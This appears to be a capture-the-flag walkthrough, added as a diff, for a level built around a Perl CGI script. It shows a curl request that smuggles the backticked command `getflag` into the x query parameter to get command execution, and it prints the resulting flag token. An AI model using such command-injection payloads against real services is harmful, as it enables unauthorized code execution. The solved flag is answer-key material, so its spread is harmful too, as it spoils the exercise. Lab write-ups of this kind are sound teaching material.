@@ -1,0 +1,14 @@
+Easy
+
+level04.pl is a cgi executable
+```
+curl localhost:4747/?x=str
+```
+will output str
+
+
+```
+curl localhost:4747/?x=`getflag`
+```
+will output the output of getflag :
+```Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap```
